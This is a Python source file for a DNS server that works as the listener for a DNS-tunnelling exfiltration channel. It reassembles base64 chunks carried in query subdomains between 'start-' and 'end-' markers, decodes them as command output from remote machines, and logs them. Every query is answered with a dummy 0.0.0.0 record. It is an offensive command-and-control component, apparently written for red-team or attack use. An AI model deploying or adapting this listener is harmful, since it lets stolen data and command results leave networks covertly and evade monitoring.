import threading
import base64
import argparse
from datetime import datetime
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, BaseResolver, DNSLogger

# Function to log DNS queries to both the console and server.log
def log_request(current_time, source_ip, chunk):
    if source_ip != '127.0.0.1':
        # Format the log message
        log_message = f"{current_time} | {source_ip} | {chunk}\n"
        
        # Print to console
        print(log_message.strip())
        
        # Append the log message to the 'server.log' file
        with open('server.log', 'a') as log_file:
            log_file.write(log_message)

# DNS Resolver
class CommandResolver(BaseResolver):
    def __init__(self):
        self.records = {}
        self.chunks = {}

    def resolve(self, request, handler):
        # Get the current date and time
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Get the source IP address
        source_ip = handler.client_address[0]
        
        qname = str(request.q.qname).strip(".")
        qtype = QTYPE[request.q.qtype]

        labels = qname.split('.')
        if "start-" in labels[0]:
            unique_id = labels[0].split("start-")[1]
            chunk = labels[1]
            self.chunks[unique_id] = [chunk]
            log_request(current_time, source_ip, f"Start of new command with ID {unique_id}.")
        elif "end-" in labels[-1]:
            unique_id = labels[-1].split("end-")[1]
            chunk = labels[0]
            if unique_id in self.chunks:
                self.chunks[unique_id].append(chunk)
                log_request(current_time, source_ip, f"End of command with ID {unique_id}. Attempting to decode...")
                self.decode_and_print(unique_id)
        else:
            chunk = labels[0]
            for unique_id in self.chunks:
                if chunk not in self.chunks[unique_id]:
                    self.chunks[unique_id].append(chunk)
                    break
        
        # Log the DNS query with timestamp and source IP
        log_request(current_time, source_ip, chunk)
        
        # Return a fake non-existing IP address as a response (e.g., 0.0.0.0)
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0"), ttl=300))
        return reply

    def decode_and_print(self, unique_id):
        base64_data = ''.join(self.chunks.get(unique_id, []))
        try:
            decoded_data = base64.b64decode(base64_data).decode('utf-8')
            log_request(datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "127.0.0.1", f"Decoded command output for ID {unique_id}:\n{decoded_data}")
            # Clear the stored chunks for this unique ID
            del self.chunks[unique_id]
        except Exception as e:
            log_request(datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "127.0.0.1", f"Failed to decode base64 data for ID {unique_id}: {e}")

# Function to start the DNS server
def start_dns_server(resolver, address="0.0.0.0", port=53):
    server = DNSServer(resolver, port=port, address=address, logger=DNSLogger("pass"))
    server.start_thread()

if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="A simple DNS server to receive and process DNS queries.")
    parser.add_argument("--port", type=int, default=None, help="Specify the port on which the DNS server will run.")
    
    # Parse the arguments
    args = parser.parse_args()

    # Determine the port
    if args.port is None:
        use_default = input("No port provided. Do you want to use the default port 53? (yes/no): ").strip().lower()
        if use_default == 'yes':
            port = 53
        else:
            try:
                port = int(input("Please enter the custom port number: ").strip())
            except ValueError:
                print("Invalid port number. Exiting.")
                exit(1)
    else:
        port = args.port

    # Start the DNS server
    resolver = CommandResolver()
    dns_thread = threading.Thread(target=start_dns_server, args=(resolver, "0.0.0.0", port))
    dns_thread.start()
    print(f"DNS Server started on port {port}...")

    # Keep the DNS server running indefinitely
    try:
        print("Waiting for DNS queries...")
        while True:
            pass
    except KeyboardInterrupt:
        print("\nStopping DNS server.")
